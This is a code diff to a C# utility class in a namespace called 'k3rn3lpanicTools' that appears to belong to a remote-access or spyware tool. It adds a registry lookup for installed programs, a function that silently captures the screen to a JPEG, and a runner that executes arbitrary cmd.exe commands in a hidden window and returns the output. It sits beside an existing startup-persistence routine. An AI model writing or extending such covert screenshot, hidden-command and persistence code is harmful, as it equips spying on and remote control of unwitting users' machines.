@@ -1,7 +1,10 @@
-﻿using Microsoft.Win32.SafeHandles;
+﻿using Microsoft.Win32;
+using Microsoft.Win32.SafeHandles;
 using System;
 using System.Collections.Generic;
 using System.Diagnostics;
+using System.Drawing;
+using System.Drawing.Imaging;
 using System.IO;
 using System.Linq;
 using System.Runtime.InteropServices;
@@ -203,7 +206,57 @@ namespace k3rn3lpanicTools
             fileHandle.Close();
             return inUse;
         }
+        public static string IsProgramInstalled(string _programname)
+        {
 
+            foreach (var item in Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths").GetSubKeyNames())
+            {
+                if (item.ToString() == _programname)
+                {
+                    string _Default = "", _Path = "";
+                    try
+                    {
+                        _Default = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\" + item).GetValue("", "").ToString();
+                    }
+                    catch
+                    {
+                        _Default = "";
+                    }
+                    try
+                    {
+                        _Path = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\" + item).GetValue("Path", "").ToString();
+                    }
+                    catch
+                    {
+                        _Path = "";
+                    }
+                    if (_Default.EndsWith(".exe"))
+                    {
+                        return _Default;
+                    }
+                    else
+                    {
+                        return _Path;
+                    }
+                }
+            }
+            return "";
+        }
+
+        public static void Capture(string CapturedFilePath)
+        {
+            try{
+                Rectangle captureRectangle = Screen.AllScreens[0].Bounds;
+                Bitmap captureBitmap = new Bitmap(captureRectangle.Width, captureRectangle.Height, PixelFormat.Format32bppArgb);
+                Graphics captureGraphics = Graphics.FromImage(captureBitmap);
+                captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);
+                captureBitmap.Save(CapturedFilePath, ImageFormat.Jpeg);
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex.Message);
+            }
+        }
         private static void set_in_startup()
         {
             if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)+"//" + SystemInfo.GetInfo(SystemInfo.InfoType.AppName)))
@@ -397,6 +450,28 @@ namespace k3rn3lpanicTools
             }
 
             return output;
+        }
+        public static string Runcommand(string command)
+        {
+            System.Diagnostics.ProcessStartInfo psi = new System.Diagnostics.ProcessStartInfo(@"cmd.exe");
+
+            psi.RedirectStandardOutput = true;
+            psi.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+            
+            psi.UseShellExecute = false;
+            psi.Arguments = "/c " + command;
+            System.Diagnostics.Process proc = System.Diagnostics.Process.Start(psi); ////
+            proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
+            System.IO.StreamReader myOutput = proc.StandardOutput;
+            proc.WaitForExit(3000);
+            if (proc.HasExited)
+            {
+                string output = myOutput.ReadToEnd();
+                return output;
+            }
+            
+            return "";
+
         }
         public static string GetRandomFolder()
         {
